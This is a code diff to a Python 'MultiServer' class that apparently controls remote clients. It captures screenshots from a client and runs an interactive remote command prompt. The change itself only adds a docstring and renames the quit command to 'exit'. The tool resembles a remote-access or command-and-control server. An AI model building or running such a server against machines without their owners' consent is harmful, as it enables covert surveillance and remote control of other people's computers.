@@ -297,6 +297,7 @@ class MultiServer(object):
         return
 
     def screenshot(self, conn):
+        """ Take screenshot on Client """
         self.send(conn, json_dumps(['--g']))
         data = self.receive(conn, _print=False)
         with open('{}.png'.format(str(datetime.now()).replace(':','-')), 'wb') as f:
@@ -324,7 +325,7 @@ class MultiServer(object):
                 _input = '{0}>'.format(cwd)
 
             command = input(_input)
-            if command == 'quit':
+            if command == 'exit':
                 break
             if command.lower() == 'cd':
                 self.send(conn, json_dumps([command]))
